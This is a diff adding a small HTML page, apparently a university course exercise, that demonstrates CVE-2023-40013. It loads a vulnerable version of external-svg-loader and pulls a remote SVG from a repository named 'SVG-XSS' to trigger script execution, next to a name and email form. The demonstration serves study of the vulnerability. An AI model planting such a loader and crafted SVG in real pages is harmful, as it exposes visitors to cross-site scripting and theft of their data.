@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script type="text/javascript" src="https://unpkg.com/external-svg-loader@1.6.8/svg-loader.min.js" async>
+    </script>
+</head>
+
+<body>
+    <h1>MAC0352 - EP3</h1>
+    <h2>CVE-2023-40013</h2>
+
+    <svg data-src="https://raw.githubusercontent.com/yesmanic/SVG-XSS/cabf79f41d612a0eed9034bb0218312b8a7542fa/cplusplus-original.svg"
+        width="50" height="50">
+    </svg>
+
+    <form action="index.php" method="post">
+        <label for="name">Name:</label><br>
+        <input type="text" id="name" name="name"><br>
+        <label for="email">Email:</label><br>
+        <input type="text" id="email" name="email"><br><br>
+        <input type="submit" value="Submit">
+    </form>
+</body>
+
+</html>
